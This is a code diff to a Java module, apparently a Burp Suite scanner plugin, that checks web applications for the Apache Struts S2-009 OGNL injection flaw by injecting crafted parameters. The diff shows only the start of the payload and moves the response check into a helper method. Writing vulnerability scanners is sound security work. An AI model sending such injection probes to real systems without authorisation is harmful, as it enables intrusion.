@@ -1,15 +1,11 @@
 package module.java.vul;
 
 import burp.*;
-import module.Util;
 
 import java.net.URLEncoder;
-import java.util.Arrays;
 import java.util.List;
 
 public class S2_009 extends IModule {
-    public String randomMark = Util.getRandomString(16);
-    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
     public String poc =
         "abcedfghij=" +
         "(" +
@@ -46,10 +42,6 @@ public class S2_009 extends IModule {
 
     @Override
     public IScanIssue start(){
-        IHttpService httpService = iHttpRequestResponse.getHttpService();
-        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
-        byte[] request = iHttpRequestResponse.getRequest();
-
         List<IParameter> parameters = requestInfo.getParameters();
         parameters.add(helpers.buildParameter("class.classLoader.jarPath", "1", (byte) 0));
         for (IParameter parameter: parameters) {
@@ -57,23 +49,15 @@ public class S2_009 extends IModule {
                 String toPoc = poc.replace("abcedfghij", parameter.getName());
 
                 String[] params = toPoc.split("&");
-                byte[] newRequest = request;
                 for (String param : params) {
                     String[] tmp = param.split("=", 2);
                     String parameterName = tmp[0];
                     String parameterValue = tmp[1];
 
                     IParameter newParameter = helpers.buildParameter(URLEncoder.encode(parameterName), URLEncoder.encode(parameterValue), parameter.getType());
-                    newRequest = helpers.updateParameter(newRequest, newParameter);
+                    request = helpers.updateParameter(request, newParameter);
                 }
-
-                IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
-                byte[] response = newHttpRequestResponse.getResponse();
-                IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
-                byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
-                String bodyText = new String(body);
-                if (bodyText.contains(randomMark)) {
-                    this.iHttpRequestResponse = newHttpRequestResponse;
+                if (check()) {
                     this.detail = URLEncoder.encode(exp)
                             .replace("%26", "&")
                             .replace("%3D", "=")
